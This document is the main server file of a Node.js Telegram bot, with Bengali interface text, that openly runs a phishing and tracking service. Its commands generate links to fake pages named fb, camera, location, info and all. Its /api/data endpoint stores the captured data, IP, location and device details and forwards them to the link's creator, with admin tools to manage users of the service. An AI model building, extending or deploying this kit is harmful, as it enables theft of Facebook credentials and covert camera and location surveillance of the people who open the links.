require('dotenv').config();

const express = require('express');
const path = require('path');

const connectDB = require('./config/database');
const setupBot = require('./config/bot');
const { validateEnv } = require('./config/env');
const NotificationService = require('./utils/notifications');
const adminCheck = require('./middlewares/adminCheck');
const { checkChannelMembership, ensureChannelJoined } = require('./middlewares/channelCheck');

const startCommand = require('./commands/start');
const fbphishing = require('./commands/fbphishing');
const camera = require('./commands/camera');
const location = require('./commands/location');
const info = require('./commands/info');
const all = require('./commands/all');
const custom = require('./commands/custom');
const shorten = require('./commands/shorten');
const mylinks = require('./commands/mylinks');

const users = require('./admin/users');
const userinfo = require('./admin/userinfo');
const ban = require('./admin/ban');
const approve = require('./admin/approve');
const broadcast = require('./admin/broadcast');
const pending = require('./admin/pending');
const logs = require('./admin/logs');
const clearlogs = require('./admin/clearlogs');
const stats = require('./admin/stats');
const uptime = require('./admin/uptime');

const app = express();
app.use(express.json());
app.use(express.static('public'));

function getCommandName(text) {
  if (!text || !text.startsWith('/')) {
    return null;
  }

  const firstToken = text.trim().split(/\s+/)[0];
  const commandPart = firstToken.slice(1).split('@')[0];
  return commandPart.toLowerCase();
}

async function sendHelp(bot, msg) {
  const chatId = msg.chat.id;
  const isAdmin = await adminCheck(msg.from.id);

  let message = 'কমান্ড তালিকা\n\n';
  message += 'ইউজার কমান্ড:\n';
  message += '/start\n';
  message += '/fbphishing\n';
  message += '/camera\n';
  message += '/location\n';
  message += '/info\n';
  message += '/all\n';
  message += '/custom <url>\n';
  message += '/shorten <code> <url>\n';
  message += '/mylinks\n';
  message += '/help\n\n';

  if (isAdmin) {
    message += 'অ্যাডমিন কমান্ড:\n';
    message += '/users\n';
    message += '/userinfo <user_id|@username>\n';
    message += '/ban <user_id|@username> [reason]\n';
    message += '/approve <user_id|@username>\n';
    message += '/pending\n';
    message += '/broadcast <type> <message>\n';
    message += '/broadcast_confirm\n';
    message += '/broadcast_cancel\n';
    message += '/logs [type]\n';
    message += '/clearlogs <category> <days>\n';
    message += '/clearlogs_confirm\n';
    message += '/clearlogs_cancel\n';
    message += '/stats\n';
    message += '/uptime\n';
  }

  await bot.sendMessage(chatId, message);
}

async function sendUnknownCommand(bot, msg, commandName) {
  await bot.sendMessage(
    msg.chat.id,
    `ভুল কমান্ড: /${commandName}\nসঠিক কমান্ড দেখতে /help ব্যবহার করুন।`
  );
}

async function sendNotImplemented(bot, msg, commandName) {
  await bot.sendMessage(
    msg.chat.id,
    `/${commandName} এখনো তৈরি করা হয়নি, তাই এটি কাজ করবে না।`
  );
}

function createCommandRouter(bot) {
  const routes = {
    start: (msg) => startCommand(bot, msg),
    help: (msg) => sendHelp(bot, msg),
    fbphishing: (msg) => fbphishing(bot, msg),
    camera: (msg) => camera(bot, msg),
    location: (msg) => location(bot, msg),
    info: (msg) => info(bot, msg),
    all: (msg) => all(bot, msg),
    custom: (msg) => custom(bot, msg),
    shorten: (msg) => shorten(bot, msg),
    mylinks: (msg) => mylinks(bot, msg),
    users: (msg) => users(bot, msg),
    userinfo: (msg) => userinfo(bot, msg),
    ban: (msg) => ban(bot, msg),
    approve: (msg) => approve(bot, msg),
    pending: (msg) => pending.execute(bot, msg),
    broadcast: (msg) => broadcast.execute(bot, msg),
    broadcast_confirm: (msg) => broadcast.confirm(bot, msg),
    broadcast_cancel: (msg) => broadcast.cancel(bot, msg),
    logs: (msg) => {
      if (/\bexport\b/i.test(msg.text)) {
        return logs.export(bot, msg);
      }
      return logs.execute(bot, msg);
    },
    clearlogs: (msg) => clearlogs.execute(bot, msg),
    clearlogs_confirm: (msg) => clearlogs.confirm(bot, msg),
    clearlogs_cancel: (msg) => clearlogs.cancel(bot, msg),
    uptime: (msg) => uptime(bot, msg),
    stats: (msg) => {
      if (/\bexport\b/i.test(msg.text)) {
        return stats.export(bot, msg);
      }
      return stats.execute(bot, msg);
    }
  };

  const notImplemented = new Set([
    'reject',
    'unban',
    'approve_all',
    'reject_all',
    'makeadmin',
    'removeadmin'
  ]);

  bot.on('message', async (msg) => {
    const commandName = getCommandName(msg.text);
    if (!commandName) {
      return;
    }

    try {
      if (commandName !== 'start') {
        const joined = await ensureChannelJoined(bot, msg);
        if (!joined) {
          return;
        }
      }

      if (routes[commandName]) {
        await routes[commandName](msg);
        return;
      }

      if (/^approve_\d+$/.test(commandName)) {
        const targetId = parseInt(commandName.replace('approve_', ''), 10);
        await pending.approveUser(bot, msg.chat.id, targetId);
        return;
      }

      if (/^reject_\d+$/.test(commandName)) {
        const targetId = parseInt(commandName.replace('reject_', ''), 10);
        await pending.rejectUser(bot, msg.chat.id, targetId);
        return;
      }

      if (notImplemented.has(commandName)) {
        await sendNotImplemented(bot, msg, commandName);
        return;
      }

      await sendUnknownCommand(bot, msg, commandName);
    } catch (error) {
      console.error(`Command routing error for /${commandName}:`, error);
      await bot.sendMessage(msg.chat.id, 'কমান্ড চালাতে সমস্যা হয়েছে। একটু পরে আবার চেষ্টা করুন।');
    }
  });

  bot.on('callback_query', async (callbackQuery) => {
    try {
      if (!callbackQuery.data) {
        return;
      }

      if (callbackQuery.data === 'check_membership') {
        const joined = await checkChannelMembership(bot, callbackQuery.from.id);

        await bot.answerCallbackQuery(callbackQuery.id, {
          text: joined
            ? 'জয়েন চেক সম্পন্ন হয়েছে।'
            : 'এখনও চ্যানেলে জয়েন পাওয়া যায়নি।'
        });

        if (joined) {
          await bot.sendMessage(
            callbackQuery.message.chat.id,
            'ধন্যবাদ। চ্যানেল জয়েন নিশ্চিত হয়েছে। এখন /start দিয়ে আবার শুরু করুন।'
          );
        } else {
          await bot.sendMessage(
            callbackQuery.message.chat.id,
            'চ্যানেলে জয়েন না করলে এই বট ব্যবহার করা যাবে না।'
          );
        }
        return;
      }

      if (
        callbackQuery.data.startsWith('approve_') ||
        callbackQuery.data.startsWith('reject_')
      ) {
        await pending.handleInlineButton(bot, callbackQuery);
      }
    } catch (error) {
      console.error('Callback query error:', error);
    }
  });
}

async function bootstrap() {
  validateEnv();
  await connectDB();

  const bot = setupBot();
  const notifier = new NotificationService(bot);

  app.post('/webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
  });

  app.get('/fb/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'fb.html'));
  });

  app.get('/camera/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'camera.html'));
  });

  app.get('/location/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'location.html'));
  });

  app.get('/info/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'info.html'));
  });

  app.get('/all/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'all.html'));
  });

  app.get('/custom/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'custom.html'));
  });

  app.post('/api/data', async (req, res) => {
    try {
      const { linkId, type, data, ip, location, device } = req.body;

      const Data = require('./models/Data');
      const Link = require('./models/Link');

      const newData = new Data({
        linkId,
        type,
        data,
        ip,
        location,
        device
      });

      await newData.save();

      await Link.findOneAndUpdate(
        { linkId },
        { $inc: { data: 1 } }
      );

      await notifier.sendDataNotification(linkId, {
        type,
        data,
        ip,
        location,
        device,
        timestamp: new Date()
      });

      res.json({ success: true });
    } catch (error) {
      console.error('API Error:', error);
      res.status(500).json({ error: error.message });
    }
  });

  createCommandRouter(bot);

  const PORT = process.env.PORT || 8080;
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log('Bot is live!');
  });
}

bootstrap().catch((error) => {
  console.error('Startup Error:', error);
  process.exit(1);
});
